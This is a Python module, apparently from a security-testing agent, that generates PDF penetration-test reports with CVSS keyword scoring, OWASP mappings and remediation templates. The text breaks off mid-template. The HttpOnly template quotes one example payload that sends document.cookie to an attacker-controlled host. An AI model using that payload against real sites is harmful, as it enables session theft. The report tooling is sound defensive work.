"""
Professional PDF Penetration Test Report Generator.

Uses ReportLab to build a styled, color-coded PDF report with cover page,
table of contents, severity badges, code blocks, and remediation roadmap.

Usage from the REPL:
    from agent.report_pdf import generate_pdf_report
    generate_pdf_report(_G, output_path='report.pdf')
"""

import datetime
from pathlib import Path

from reportlab.lib import colors
from reportlab.lib.enums import TA_LEFT, TA_CENTER, TA_RIGHT, TA_JUSTIFY
from reportlab.lib.pagesizes import A4
from reportlab.lib.styles import getSampleStyleSheet, ParagraphStyle
from reportlab.lib.units import mm, cm, inch
from reportlab.platypus import (
    SimpleDocTemplate, Paragraph, Spacer, Table, TableStyle,
    PageBreak, HRFlowable, KeepTogether, Frame, PageTemplate,
    BaseDocTemplate, NextPageTemplate,
)
from reportlab.platypus.tableofcontents import TableOfContents
from reportlab.lib.colors import HexColor


# ── Severity colours ──────────────────────────────────────────────────────────

SEV_COLORS = {
    "CRITICAL": {"text": HexColor("#FFFFFF"), "bg": HexColor("#C62828"), "bar": HexColor("#C62828")},
    "HIGH":     {"text": HexColor("#FFFFFF"), "bg": HexColor("#E65100"), "bar": HexColor("#E65100")},
    "MEDIUM":   {"text": HexColor("#333333"), "bg": HexColor("#FFB300"), "bar": HexColor("#F9A825")},
    "LOW":      {"text": HexColor("#FFFFFF"), "bg": HexColor("#2E7D32"), "bar": HexColor("#2E7D32")},
    "INFO":     {"text": HexColor("#FFFFFF"), "bg": HexColor("#1565C0"), "bar": HexColor("#1565C0")},
}

SEV_RANK = {"CRITICAL": 0, "HIGH": 1, "MEDIUM": 2, "LOW": 3, "INFO": 4}

RISK_LABELS = {
    "CRITICAL": "Application is critically vulnerable. Immediate exploitation possible. Emergency remediation required within 24-48 hours.",
    "POOR":     "Multiple high-severity vulnerabilities present. Remediate within 1-2 weeks.",
    "MODERATE": "Some medium-severity issues identified. Remediate within 1 month.",
    "GOOD":     "Only low-severity or informational findings. Application follows most security best practices.",
    "STRONG":   "No significant findings. Application demonstrates mature security controls.",
}

OWASP_MAP = {
    "SQL Injection": "A03:2021 Injection", "SQLi": "A03:2021 Injection",
    "Command Injection": "A03:2021 Injection", "CMDi": "A03:2021 Injection",
    "XSS": "A03:2021 Injection", "SSTI": "A03:2021 Injection",
    "SSRF": "A10:2021 SSRF", "CSRF": "A01:2021 Broken Access Control",
    "IDOR": "A01:2021 Broken Access Control",
    "Deserialization": "A08:2021 Integrity Failures",
    "File Upload": "A04:2021 Insecure Design",
    "Open Redirect": "A01:2021 Broken Access Control",
    "CORS": "A05:2021 Security Misconfiguration",
    "Missing CSP": "A05:2021 Security Misconfiguration",
    "Security Header": "A05:2021 Security Misconfiguration",
    "Session": "A07:2021 Auth Failures", "Cookie": "A07:2021 Auth Failures",
    "JWT": "A02:2021 Cryptographic Failures",
    "Secret": "A02:2021 Cryptographic Failures",
    "Version": "A06:2021 Vulnerable Components",
    "jQuery": "A06:2021 Vulnerable Components",
    "CVE": "A06:2021 Vulnerable Components",
    "Rate Limit": "A07:2021 Auth Failures",
    "GraphQL": "A03:2021 Injection", "CRLF": "A03:2021 Injection",
    "NoSQL": "A03:2021 Injection", "XXE": "A05:2021 Security Misconfiguration",
    "Path Traversal": "A01:2021 Broken Access Control",
    "Business Logic": "A04:2021 Insecure Design",
    "Mass Assignment": "A01:2021 Broken Access Control",
    "Race Condition": "A04:2021 Insecure Design",
    "API": "A01:2021 Broken Access Control",
    "Default Cred": "A07:2021 Auth Failures",
    "Data Exposure": "A02:2021 Cryptographic Failures",
}

# ── CVSS v3.1 auto-scoring ────────────────────────────────────────────────────
# Maps vulnerability keywords → (score, vector_string)
# Based on standard CVSS v3.1 base metrics for each vulnerability class.
# These are reasonable defaults — real CVSS depends on exact conditions.
CVSS_MAP = {
    # ── INFORMATIONAL / LOW — specific patterns that must match before broad ones ──
    # robots.txt, sitemap, common public files — not a real vulnerability
    "robots.txt":           (0.0, "AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:N"),
    "sitemap":              (0.0, "AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:N"),
    "favicon":              (0.0, "AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:N"),
    # Expired / invalid tokens — informational, no active risk
    "expired":              (2.0, "AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N"),
    "invalid token":        (2.0, "AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N"),
    # Speculative / "could be" findings
    "could be weak":        (3.1, "AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N"),
    "could be":             (3.1, "AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N"),
    "potential":            (3.1, "AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N"),
    # API documentation exposed — low, not high
    "API Documentation":    (3.7, "AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N"),
    "Swagger":              (3.7, "AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N"),
    "OpenAPI":              (3.7, "AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N"),
    # Internal IP/path disclosure — informational
    "Internal IP":          (3.7, "AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N"),
    "Internal Endpoint":    (3.7, "AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N"),
    "INTERNAL_ENDPOINT":    (5.3, "AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N"),
    "JS Secret":            (7.5, "AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N"),
    # Server/technology fingerprint — low risk
    "Server Version":       (3.7, "AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N"),
    "Server Banner":        (3.7, "AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N"),
    "Technology":           (3.7, "AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N"),
    "Fingerprint":          (3.7, "AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N"),
    # ── CRITICAL class — Remote Code Execution, Auth Bypass, Data Breach ──
    "RCE":                  (9.8, "AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"),
    "Remote Code":          (9.8, "AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"),
    "Deserialization":      (9.8, "AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"),
    "Pickle":               (9.8, "AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"),
    "Command Injection":    (9.8, "AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"),
    "CMDi":                 (9.8, "AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"),
    "SQL Injection":        (9.8, "AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"),
    "SQLi":                 (9.8, "AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"),
    "Auth Bypass":          (9.8, "AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"),
    "NoSQL Injection":      (9.8, "AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"),
    "NoSQL":                (9.8, "AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"),
    # ── HIGH class — SSTI, SSRF, XSS, Secrets, IDOR ──
    "SSTI":                 (9.1, "AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N"),
    "Template Injection":   (9.1, "AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N"),
    "SSRF":                 (8.6, "AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N"),
    "XXE":                  (8.2, "AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N"),
    "Path Traversal":       (7.5, "AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N"),
    "File Read":            (7.5, "AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N"),
    "Stored XSS":           (6.5, "AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N"),
    "DOM XSS":              (6.1, "AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N"),
    "XSS":                  (6.1, "AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N"),
    "IDOR":                 (7.5, "AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N"),
    "Privilege Escalation": (8.8, "AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H"),
    "privilege-escalation": (8.8, "AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H"),
    "Broken Access":        (7.5, "AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N"),
    "Access Control":       (7.5, "AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N"),
    "Hardcoded Secret":     (7.5, "AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N"),
    "Hardcoded Password":   (7.5, "AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N"),
    "Hardcoded":            (5.3, "AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N"),
    "AWS Key":              (7.5, "AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N"),
    "AWS":                  (5.3, "AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N"),
    "API Key":              (7.5, "AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N"),
    "Default Cred":         (8.6, "AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N"),
    "Sensitive Data":       (6.5, "AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N"),
    "Data Exposure":        (5.3, "AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N"),
    "Excessive Data":       (5.3, "AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N"),
    "excessive-data":       (5.3, "AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N"),
    "Unauth":               (7.5, "AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N"),
    "File Upload":          (8.1, "AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N"),
    "JWT Secret":           (7.5, "AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N"),
    "JWT":                  (4.3, "AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:N/A:N"),
    "Secret":               (5.3, "AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N"),
    "Exposed":              (5.3, "AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N"),
    # ── MEDIUM class — CSRF, CORS, Smuggling, Debug, Config ──
    "CSRF":                 (6.5, "AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:N"),
    "CORS":                 (5.3, "AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N"),
    "Open Redirect":        (6.1, "AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N"),
    "Smuggling":            (5.9, "AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:H/A:N"),
    "Request Smuggling":    (5.9, "AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:H/A:N"),
    "Debug":                (5.3, "AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N"),
    "debug-mode":           (5.3, "AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N"),
    "Rate Limit":           (5.3, "AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:L"),
    "no-rate-limit":        (5.3, "AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:L"),
    "Race Condition":       (5.9, "AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:H/A:N"),
    "Business Logic":       (5.4, "AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:N"),
    "Mass Assignment":      (6.5, "AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N"),
    "GraphQL":              (5.3, "AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N"),
    "CRLF":                 (6.1, "AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N"),
    # ── LOW class — Missing headers, info disclosure ──
    "Missing":              (4.3, "AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:L/A:N"),
    "Cookie":               (4.3, "AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:N/A:N"),
    "Session":              (5.4, "AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N"),
    "Version Disclosure":   (3.7, "AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N"),
    "Version":              (3.7, "AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N"),
    "jQuery":               (6.1, "AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N"),
    "CVE":                  (6.1, "AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N"),
    "Disclosure":           (3.7, "AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N"),
    "Info":                 (3.7, "AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N"),
}


def _guess_cvss(title: str, severity: str = "") -> str:
    """Auto-calculate CVSS v3.1 score + vector from finding title.

    The score is capped by the finding's assigned severity level so that
    a LOW finding can never exceed CVSS 3.9 regardless of keyword match.
    """
    # Maximum CVSS allowed for each severity tier
    _SEV_CAPS = {
        "CRITICAL": 10.0,
        "HIGH":     8.9,
        "MEDIUM":   6.9,
        "LOW":      3.9,
        "INFO":     2.0,
    }
    if not title:
        return "—"
    t = title.lower()
    sev_upper = severity.upper() if severity else ""
    cap = _SEV_CAPS.get(sev_upper, 10.0)

    # Sort keywords longest-first so specific patterns match before broad ones
    sorted_kw = sorted(CVSS_MAP.items(), key=lambda kv: len(kv[0]), reverse=True)
    for keyword, (score, vector) in sorted_kw:
        if keyword.lower() in t:
            capped = min(score, cap)
            return f"{capped} ({vector})"

    # Fallback: assign a score range based on severity
    sev_defaults = {
        "CRITICAL": "9.0 (estimated)",
        "HIGH":     "7.0 (estimated)",
        "MEDIUM":   "5.0 (estimated)",
        "LOW":      "3.0 (estimated)",
        "INFO":     "0.0",
    }
    return sev_defaults.get(sev_upper, "—")


# ── Mitigation templates ──────────────────────────────────────────────────────

MITIGATION_MAP = {
    "SQL Injection": {
        "desc": "The application does not properly validate or sanitize user input before incorporating it into SQL queries, allowing an attacker to manipulate database operations.",
        "steps": [
            "Use parameterized queries (prepared statements) for all database interactions.",
            "Implement an ORM (e.g., SQLAlchemy, Hibernate) instead of raw SQL queries.",
            "Apply input validation using a whitelist approach for expected data types.",
            "Implement least-privilege database accounts — the application should not use a DBA account.",
            "Deploy a Web Application Firewall (WAF) as an additional layer of defense.",
        ],
        "refs": [
            ("OWASP SQL Injection Prevention", "https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html"),
        ],
    },
    "XSS": {
        "desc": "It was identified that the application does not properly encode or sanitize user-supplied input before rendering it in HTML responses, allowing injection of malicious scripts.",
        "steps": [
            "Implement context-aware output encoding for all user-supplied data (HTML, JavaScript, URL, CSS contexts).",
            "Deploy a strict Content Security Policy (CSP) header that prevents inline script execution.",
            "Use templating engines with auto-escaping enabled by default (e.g., Jinja2 with autoescape=True).",
            "Validate and sanitize all input on the server side using a whitelist approach.",
            "Set the HttpOnly flag on session cookies to prevent theft via XSS.",
        ],
        "refs": [
            ("OWASP XSS Prevention", "https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html"),
        ],
    },
    "Command Injection": {
        "desc": "The application passes user-controlled input directly to operating system commands without proper sanitization, allowing an attacker to execute arbitrary commands on the server.",
        "steps": [
            "Avoid calling OS commands directly — use language-native libraries instead.",
            "If OS commands are necessary, use parameterized APIs (e.g., subprocess with shell=False in Python).",
            "Implement strict input validation using a whitelist of allowed characters.",
            "Run the application with minimal OS privileges (principle of least privilege).",
            "Use sandboxing or containerization to limit the impact of command execution.",
        ],
        "refs": [
            ("OWASP Command Injection", "https://owasp.org/www-community/attacks/Command_Injection"),
        ],
    },
    "CSRF": {
        "desc": "The application does not implement anti-CSRF tokens on state-changing forms, allowing an attacker to forge requests on behalf of authenticated users.",
        "steps": [
            "Implement anti-CSRF tokens (synchronizer token pattern) on all state-changing forms.",
            "Set the SameSite attribute on session cookies to 'Strict' or 'Lax'.",
            "Verify the Origin and Referer headers on state-changing requests.",
            "Require re-authentication for sensitive operations (password change, email change).",
        ],
        "refs": [
            ("OWASP CSRF Prevention", "https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html"),
        ],
    },
    "IDOR": {
        "desc": "The application does not enforce proper authorization checks when accessing resources by identifier, allowing users to access or modify other users' data by manipulating object references.",
        "steps": [
            "Implement server-side authorization checks for every resource access — verify the requesting user owns the resource.",
            "Use indirect object references (e.g., map internal IDs to per-session tokens).",
            "Log and monitor access patterns for anomalous behavior.",
            "Apply the principle of least privilege — users should only access their own resources.",
        ],
        "refs": [
            ("OWASP IDOR", "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/04-Testing_for_Insecure_Direct_Object_References"),
        ],
    },
    "SSRF": {
        "desc": "The application accepts user-supplied URLs and fetches them server-side without proper validation, allowing an attacker to make the server send requests to internal services or cloud metadata endpoints.",
        "steps": [
            "Implement a URL allowlist — only permit requests to known, trusted external hosts.",
            "Block requests to private/internal IP ranges (10.x, 172.16-31.x, 192.168.x, 127.x, 169.254.x).",
            "Disable HTTP redirects when fetching user-supplied URLs.",
            "Use a dedicated HTTP proxy for outbound requests with network-level restrictions.",
            "If cloud-hosted, restrict access to the metadata service (169.254.169.254).",
        ],
        "refs": [
            ("OWASP SSRF Prevention", "https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html"),
        ],
    },
    "SSTI": {
        "desc": "The application passes user input directly into server-side template rendering functions, allowing an attacker to inject template directives and achieve remote code execution.",
        "steps": [
            "Never pass user input directly to template rendering functions (e.g., render_template_string).",
            "Use template engines with sandboxed execution environments.",
            "Implement strict input validation — reject template syntax characters ({{ }}, <% %>, etc.).",
            "Use logic-less templates where possible.",
        ],
        "refs": [
            ("PortSwigger SSTI", "https://portswigger.net/web-security/server-side-template-injection"),
        ],
    },
    "Deserialization": {
        "desc": "The application deserializes untrusted data without validation, allowing an attacker to craft malicious serialized objects that execute arbitrary code upon deserialization.",
        "steps": [
            "Never deserialize data from untrusted sources.",
            "If deserialization is required, use safe formats (JSON) instead of native serialization (pickle, Java serialization).",
            "Implement integrity checks (HMAC) on serialized data before deserialization.",
            "Run deserialization in a sandboxed environment with minimal privileges.",
            "Use allowlists for permitted classes during deserialization.",
        ],
        "refs": [
            ("OWASP Deserialization", "https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html"),
        ],
    },
    "Security Header": {
        "desc": "The application is missing important HTTP security headers that provide defense-in-depth against common web attacks.",
        "steps": [
            "Implement Content-Security-Policy (CSP) to prevent XSS and data injection attacks.",
            "Enable Strict-Transport-Security (HSTS) with a minimum max-age of 31536000.",
            "Set X-Content-Type-Options: nosniff to prevent MIME type sniffing.",
            "Set X-Frame-Options: DENY or SAMEORIGIN to prevent clickjacking.",
            "Remove the Server and X-Powered-By headers to reduce information disclosure.",
        ],
        "refs": [
            ("OWASP Secure Headers", "https://owasp.org/www-project-secure-headers/"),
        ],
    },
    "Default Cred": {
        "desc": "The application uses default or easily guessable credentials for user accounts, allowing unauthorized access without any exploitation.",
        "steps": [
            "Force password changes on first login for all default accounts.",
            "Implement a strong password policy (minimum length, complexity requirements).",
            "Remove or disable all default/test accounts in production.",
            "Implement account lockout after repeated failed login attempts.",
        ],
        "refs": [
            ("OWASP Authentication", "https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html"),
        ],
    },
    "Secure Flag": {
        "desc": (
            "During testing, it was identified that one or more cookies set by the application do not include the Secure flag. "
            "The Secure attribute instructs the browser to only send the cookie over HTTPS connections; without it, the cookie "
            "will also be transmitted over unencrypted HTTP connections. An attacker performing a man-in-the-middle attack on "
            "the network (e.g., via ARP spoofing on a shared WiFi network, a compromised router, or DNS hijacking) can intercept "
            "the plaintext HTTP traffic and capture the cookie value. If the cookie is a session token or authentication credential, "
            "this directly leads to session hijacking and account takeover.\n\n"
            "This is particularly dangerous for applications that handle authentication tokens, refresh tokens, or any cookie that "
            "grants access to protected functionality. Even if the application redirects HTTP to HTTPS, the initial plaintext "
            "request will still carry the cookie, exposing it during the redirect window."
        ),
        "steps": [
            "Set the Secure flag on ALL cookies that contain sensitive data (session tokens, authentication tokens, refresh tokens, CSRF tokens).",
            "Ensure the application is served exclusively over HTTPS and implement HSTS to prevent protocol downgrade attacks.",
            "Set the SameSite attribute to 'Strict' or 'Lax' on all session cookies to prevent cross-site request forgery.",
            "Review all Set-Cookie headers in the application to ensure consistent security flag configuration.",
            "Implement automated testing in the CI/CD pipeline to verify that all cookies include the Secure, HttpOnly, and SameSite attributes.",
        ],
        "refs": [
            ("OWASP Session Management", "https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html"),
            ("CWE-614: Sensitive Cookie Without Secure Flag", "https://cwe.mitre.org/data/definitions/614.html"),
        ],
    },
    "HttpOnly": {
        "desc": (
            "During testing, it was identified that one or more cookies set by the application do not include the HttpOnly flag. "
            "The HttpOnly attribute instructs the browser to prevent client-side JavaScript from accessing the cookie via "
            "document.cookie or similar APIs. Without this flag, if an attacker successfully exploits a Cross-Site Scripting (XSS) "
            "vulnerability anywhere in the application, they can trivially exfiltrate the cookie value using a simple JavaScript "
            "payload such as: new Image().src='https://attacker.com/steal?c='+document.cookie.\n\n"
            "This is especially critical for session tokens and authentication cookies, as their theft directly enables session "
            "hijacking. The HttpOnly flag is a defence-in-depth mechanism that significantly limits the impact of XSS by preventing "
            "the most common attack vector (cookie theft) even when XSS is present."
        ),
        "steps": [
            "Set the HttpOnly flag on ALL cookies containing session identifiers, authentication tokens, or sensitive data.",
            "Review all Set-Cookie headers in the application to ensure consistent security flag configuration.",
            "Combine HttpOnly with the Secure flag and SameSite attribute for comprehensive cookie protection.",
            "Ensure session tokens are never exposed to client-side JavaScript through any mechanism (cookies, localStorage, DOM attributes).",
            "Implement Content Security Policy (CSP) as an additional layer of XSS protection.",
        ],
        "refs": [
            ("OWASP Session Management", "https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html"),
            ("CWE-1004: Sensitive Cookie Without HttpOnly", "https://cwe.mitre.org/data/definitions/1004.html"),
        ],
    },
    "Rate Limit": {
        "desc": (
            "During testing, it was identified that the application does not implement rate limiting or account lockout mechanisms "
            "on authentication endpoints. Repeated login attempts with invalid credentials were accepted at machine speed without "
            "any throttling, blocking, CAPTCHA challenge, or account lockout.\n\n"
            "The absence of rate limiting allows automated brute-force and credential stuffing attacks to proceed uninhibited. "
            "An attacker can use tools such as Hydra, Burp Intruder, or custom scripts to systematically test thousands of "
            "password combinations per minute. This is particularly dangerous when combined with common password lists (e.g., "
            "rockyou.txt) or credentials leaked from other breaches, as credential reuse is widespread among users."
        ),
        "steps": [
            "Implement progressive rate limiting on authentication endpoints — e.g., allow 5 attempts per minute, then enforce exponential backoff.",
            "Deploy account lockout after a configurable number of failed attempts (e.g., 10 attempts) with automatic unlock after a timeout period.",
            "Implement CAPTCHA or proof-of-work challenges after 3-5 failed login attempts from the same source.",
            "Monitor and alert on anomalous authentication patterns (high failure rates, distributed attempts across accounts).",
            "Require multi-factor authentication (MFA) for all user accounts to mitigate the impact of compromised passwords.",
            "Consider implementing credential stuffing detection by checking passwords against known breach databases (e.g., HaveIBeenPwned API).",
        ],
        "refs": [
            ("OWASP Brute Force Prevention", "https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html"),
            ("CWE-307: Improper Restriction of Excessive Auth Attempts", "https://cwe.mitre.org/data/definitions/307.html"),
        ],
    },
    "Strict-Transport-Security": {
        "desc": (
            "The target web application does not implement HTTP Strict Transport Security (HSTS), a security mechanism that "
            "instructs web browsers to only communicate with the server over HTTPS connections. Without HSTS, users who type "
            "the domain name directly into their browser address bar or follow an HTTP link will initially connect over "
            "unencrypted HTTP before being redirected to HTTPS, creating a window of vulnerability for man-in-the-middle attacks.\n\n"
            "The absence of HSTS means that an attacker performing a man-in-the-middle attack can intercept the initial HTTP "
            "connection and prevent the redirect to HTTPS using tools such as sslstrip. The attacker proxies the connection to "
            "the legitimate HTTPS site while serving content to the victim over HTTP, capturing all transmitted data including "
            "credentials and session tokens in plaintext.\n\n"
            "Testing confirmed that the server does not include the Strict-Transport-Security response header in HTTPS responses. "
            "While the server does redirect HTTP requests to HTTPS, this redirect occurs over an unencrypted connection and can "
            "be intercepted and blocked by a MitM attacker before the browser establishes the HTTPS connection."
        ),
        "steps": [
            "Implement HSTS across all web properties by adding the header: Strict-Transport-Security: max-age=31536000; includeSubDomains; preload",
            "Submit high-priority domains to the HSTS preload list (https://hstspreload.org/) to provide protection even on the very first visit.",
            "Review all subdomains before enabling includeSubDomains to ensure they all support HTTPS.",
            "Complement HSTS with other HTTP security headers including Content-Security-Policy, X-Content-Type-Options, X-Frame-Options, and Referrer-Policy.",
            "Implement automated scanning of response headers across all web properties to detect missing security headers and configuration drift.",
        ],
        "refs": [
            ("OWASP HSTS", "https://cheatsheetseries.owasp.org/cheatsheets/HTTP_Strict_Transport_Security_Cheat_Sheet.html"),
            ("CWE-319: Cleartext Transmission", "https://cwe.mitre.org/data/definitions/319.html"),
            ("HSTS Preload List", "https://hstspreload.org/"),
        ],
    },
    "Content-Security-Policy": {
        "desc": (
            "The application does not implement a Content Security Policy (CSP) header. CSP is a critical defence-in-depth "
            "mechanism that instructs the browser to restrict the sources from which scripts, styles, images, and other resources "
            "can be loaded. Without CSP, even if the application properly encodes output, any XSS vulnerability that bypasses "
            "encoding can execute arbitrary inline scripts and load external resources without restriction.\n\n"
            "A properly configured CSP can prevent or significantly mitigate the impact of XSS attacks by blocking inline script "
            "execution, restricting script sources to trusted domains, and preventing data exfiltration to attacker-controlled "
            "servers. The absence of CSP means the application relies entirely on output encoding as its sole XSS defence."
        ),
        "steps": [
            "Implement a strict Content-Security-Policy header that disallows inline scripts (no 'unsafe-inline') and restricts script sources to known trusted domains.",
            "Start with a report-only policy (Content-Security-Policy-Report-Only) to identify violations without breaking functionality.",
            "Use nonce-based or hash-based CSP for any necessary inline scripts instead of 'unsafe-inline'.",
            "Deploy a CSP violation reporting endpoint to monitor and respond to policy violations in production.",
            "Review and tighten the CSP periodically as the application evolves.",
        ],
        "refs": [
            ("OWASP CSP", "https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html"),
            ("CWE-693: Protection Mechanism Failure", "https://cwe.mitre.org/data/definitions/693.html"),
        ],
    },
    "X-Frame-Options": {
        "desc": (
            "The application does not set the X-Frame-Options response header, which is used to prevent the page from being "
            "embedded in an iframe by a malicious site. Without this header, an attacker can create a page that loads the target "
            "application in a hidden or transparent iframe and trick the user into clicking on elements within it — a technique "
            "known as clickjacking.\n\n"
            "Clickjacking attacks can be used to trick users into performing unintended actions such as changing account settings, "
            "making purchases, transferring funds, or granting OAuth permissions. The attack is particularly effective because "
            "the victim believes they are interacting with the attacker's page while actually clicking on the framed application."
        ),
        "steps": [
            "Set the X-Frame-Options header to DENY (if the application is never intended to be framed) or SAMEORIGIN (if framing from the same origin is required).",
            "Implement the frame-ancestors directive in Content-Security-Policy as a more flexible alternative: Content-Security-Policy: frame-ancestors 'none'",
            "Review all pages for legitimate framing requirements before applying a blanket DENY policy.",
            "Test the implementation across multiple browsers to ensure consistent enforcement.",
        ],
        "refs": [
            ("OWASP Clickjacking", "https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking_Defense_Cheat_Sheet.html"),
            ("CWE-1021: Improper Restriction of Rendered UI", "https://cwe.mitre.org/data/definitions/1021.html"),
        ],
    },
    "X-Content-Type-Options": {
        "desc": (
            "The application does not set the X-Content-Type-Options: nosniff response header. This header prevents browsers from "
            "performing MIME-type sniffing, which is the practice of ignoring the declared Content-Type and instead determining the "
            "type of a response based on its content. Without this header, a browser may interpret a non-executable response "
            "(e.g., a JSON response or uploaded file) as HTML or JavaScript, creating opportunities for XSS attacks.\n\n"
            "MIME sniffing is particularly dangerous in scenarios involving user-uploaded content or API responses where an attacker "
            "can inject HTML/JavaScript content that the browser then executes despite the server declaring a non-executable content type."
        ),
        "steps": [
            "Set X-Content-Type-Options: nosniff on all HTTP responses.",
            "Ensure all responses include accurate Content-Type headers that match the actual content.",
            "Implement this header via server middleware or reverse proxy configuration for consistent application.",
            "Combine with a strict Content-Security-Policy for comprehensive protection against content injection.",
        ],
        "refs": [
            ("MDN X-Content-Type-Options", "https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Content-Type-Options"),
            ("OWASP Secure Headers", "https://owasp.org/www-project-secure-headers/"),
        ],
    },
    "Referrer-Policy": {
        "desc": (
            "The application does not set a Referrer-Policy header, which controls how much referrer information is included "
            "in requests when users navigate away from the application. Without a restrictive referrer policy, the full URL "
            "(including any sensitive parameters such as tokens, session IDs, or internal paths) may be leaked to external sites "
            "via the Referer header when users click outbound links or when the page loads external resources."
        ),
        "steps": [
            "Set Referrer-Policy: strict-origin-when-cross-origin (recommended default) or no-referrer for maximum privacy.",
            "Avoid placing sensitive data (tokens, session IDs) in URL query parameters.",
            "Implement this header via server middleware or reverse proxy for consistent application.",
        ],
        "refs": [
